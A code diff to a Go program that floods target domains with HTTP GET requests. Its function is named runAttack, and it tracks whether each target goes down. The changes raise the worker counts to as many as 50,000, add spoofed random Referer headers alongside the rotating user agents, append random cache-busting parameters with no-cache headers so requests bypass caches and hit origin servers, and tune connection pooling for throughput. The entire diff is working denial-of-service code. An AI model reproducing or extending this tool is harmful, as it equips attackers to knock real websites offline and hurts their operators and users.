@@ -1,12 +1,14 @@
 package main
 
 import (
-"fmt"
-"math/rand"
-"net/http"
-"sync"
-"sync/atomic"
-"time"
+	"fmt"
+	"io"
+	"math/rand"
+	"net/http"
+	"net/url"
+	"sync"
+	"sync/atomic"
+	"time"
 )
 
 var userAgents = []string{
@@ -19,6 +21,19 @@ var userAgents = []string{
 
 func getRandomUserAgent() string {
 	return userAgents[rand.Intn(len(userAgents))]
+}
+
+var referrers = []string{
+	"https://www.google.com/",
+	"https://www.bing.com/",
+	"https://www.facebook.com/",
+	"https://twitter.com/",
+	"https://www.linkedin.com/",
+	"https://duckduckgo.com/",
+}
+
+func getRandomReferrer() string {
+	return referrers[rand.Intn(len(referrers))]
 }
 
 type domainStats struct {
@@ -49,16 +64,26 @@ func applyLevelSettings(o *options) {
 	}
 
 	switch o.level {
-	case 1: o.concurrency = 50
-	case 2: o.concurrency = 150
-	case 3: o.concurrency = 300
-	case 4: o.concurrency = 750
-	case 5: o.concurrency = 1500
-	case 6: o.concurrency = 3000
-	case 7: o.concurrency = 5000
-	case 8: o.concurrency = 8000
-	case 9: o.concurrency = 12000
-	case 10: o.concurrency = 20000
+	case 1:
+		o.concurrency = 100
+	case 2:
+		o.concurrency = 500
+	case 3:
+		o.concurrency = 1500
+	case 4:
+		o.concurrency = 3000
+	case 5:
+		o.concurrency = 7000
+	case 6:
+		o.concurrency = 12000
+	case 7:
+		o.concurrency = 18000
+	case 8:
+		o.concurrency = 25000
+	case 9:
+		o.concurrency = 35000
+	case 10:
+		o.concurrency = 50000
 	}
 
 	fmt.Printf("🎚️  Power Level: %d -> %d Workers\n", o.level, o.concurrency)
@@ -93,9 +118,12 @@ func runAttack(domains []string, o options) {
 		}
 
 		client := &http.Client{
-			Timeout: 5 * time.Second,
+			Timeout: 10 * time.Second,
 			Transport: &http.Transport{
-				DisableKeepAlives: o.noKeepAlive,
+				DisableKeepAlives:   o.noKeepAlive,
+				MaxIdleConns:        o.concurrency * 2,
+				MaxIdleConnsPerHost: o.concurrency * 2,
+				IdleConnTimeout:     10 * time.Second,
 			},
 		}
 
@@ -124,7 +152,7 @@ func runAttack(domains []string, o options) {
 
 			fmt.Printf("  %s -> %s\n", s.domain, downStr)
 			fmt.Printf("    Reqs: %d (Success: %d, Fail: %d)\n",
-atomic.LoadInt64(&s.totalRequests),
+				atomic.LoadInt64(&s.totalRequests),
 				atomic.LoadInt64(&s.successRequests),
 				atomic.LoadInt64(&s.failedRequests))
 			s.mu.Unlock()
@@ -137,17 +165,29 @@ atomic.LoadInt64(&s.totalRequests),
 
 func worker(client *http.Client, targetURL string, s *domainStats, deadline time.Time) {
 	for time.Now().Before(deadline) {
-		req, _ := http.NewRequest("GET", targetURL, nil)
+		// Random Cache-Bypass
+		cb := fmt.Sprintf("%d", rand.Int63())
+		u, _ := url.Parse(targetURL)
+		q := u.Query()
+		q.Set("cb", cb)
+		u.RawQuery = q.Encode()
+
+		req, _ := http.NewRequest("GET", u.String(), nil)
 		req.Header.Set("User-Agent", getRandomUserAgent())
+		req.Header.Set("Referer", getRandomReferrer())
+		req.Header.Set("Cache-Control", "no-cache")
 
 		atomic.AddInt64(&s.totalRequests, 1)
 		resp, err := client.Do(req)
 		if err != nil {
 			atomic.AddInt64(&s.failedRequests, 1)
 		} else {
+			// Fast body discard
+			io.Copy(io.Discard, resp.Body)
 			resp.Body.Close()
+
 			if resp.StatusCode >= 500 {
-				atomic.AddInt64(&s.failedRequests, 1) // Server errors count as fail
+				atomic.AddInt64(&s.failedRequests, 1)
 			} else {
 				atomic.AddInt64(&s.successRequests, 1)
 			}
